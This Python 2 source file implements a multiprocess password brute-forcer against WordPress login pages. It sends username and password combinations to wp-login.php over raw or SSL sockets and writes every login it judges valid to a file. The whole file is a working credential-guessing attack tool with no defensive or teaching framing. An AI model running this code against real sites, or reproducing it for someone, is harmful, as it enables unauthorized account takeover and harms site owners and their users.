# TODO: shits going kind of slow
import socket, re, itertools, ssl
from time import sleep
from os import strerror
from multiprocessing import Pool, Lock, active_children
from urllib import urlencode

global lock
lock = Lock()

class BrutePasswords(object):
	def __init__(self,username,password):
		self.username = username
		self.password = password
		self.postfields = urlencode([('log',self.username),('pwd',self.password),('wp-submit','Log+In')])

	def run(self):
		self.trigger = 0
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		if (secure == 1):	self.ssocket = ssl.wrap_socket(self.s)
		else:	self.ssocket = self.s
		self.connmsg = self.ssocket.connect_ex((host,port))
		while (self.connmsg != 0):
			print("ERROR:\t%s" % strerror(self.connmsg))
			sleep(2.1)
			self.connmsg = self.ssocket.connect_ex((host,port))
		self.ssocket.send("POST "+path+"wp-login.php HTTP/1.1\r\nContent-Length: "+str(len(self.postfields))+"\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: "+host+"\r\n\r\n"+self.postfields)
		self.chunk = self.ssocket.recv(2600)
		while (self.chunk.find("action=lostpassword") <= 0 and self.trigger != 8):
			sleep(1)
			self.chunk += self.ssocket.recv(800)
			self.trigger += 1
		self.ssocket.close()
		if (self.trigger == 8):
			print("Not enough data returned")
			return 1
		if (self.chunk.find("is incorrect") <= 0):
			print("Valid login found:\t%s:%s" % (self.username,self.password))
			lock.acquire()
			f = open(logins,"a")
			f.write("%s:%s\n" % (self.username,self.password))
			f.close()
			lock.release()
		elif (self.chunk.find("500 Internal") > 0):
			print("500 Internal Server Error seen, you may be sending too fast!")
			return 1
		elif (self.chunk.find("200 OK") <= 0):
			print("Irregular server response seen.\n%s" % str(chunk))
			return 1
		return 0

def worker(passlist):
	for username in usernames:
		username = str(username.strip("\n"))
		for password in passlist:
			password = str(password.strip("\n"))
			#print("%s:%s" % (username,password))
			while (BrutePasswords(username,password).run() != 0):	sleep(1)
	
def grouper(iterable,n,fillvalue=None):
    it = iter(iterable)
    def take():
        while 1: yield list(itertools.islice(it,n))
    return iter(take().next,[])

def brutePasses(userlist,passlist,hosti,pathi,porti,securei,psize,loginsi):
	global host
	host = hosti
	global port
	port = porti
	global secure
	secure = securei
	global logins
	logins = loginsi
	global path
	path = pathi
	global usernames
	usernames = userlist
	usersize = len(userlist)
	passsize = len(passlist)
	
	# manage pool
	if (psize == 0):	psize = 5
	if ((usersize*passsize) <= psize):	chunksize = 1
	else:	chunksize = (((usersize*passsize) / psize) + ((usersize*passsize) % psize))
	#print("%s" % ((ceil(float((usersize*passsize)) / psize)) + ((usersize*passsize) % psize)))
	print("Userlist size: %d\tPassword size: %d\tChunk size: %d\tPool size: %d" % (usersize,passsize,chunksize,psize))
	pool = Pool(processes=psize)
        for chunk in itertools.izip(grouper(passlist,chunksize)):  pool.map_async(worker,chunk)
        pool.close()
        try:
                while(len(active_children()) > 0): # how many active children do we have
                        sleep(2)
                        ignore = active_children()
        except KeyboardInterrupt:       exit('CTRL^C caught, exiting...\n\n')
	print("Password bruteforce attempts completed")
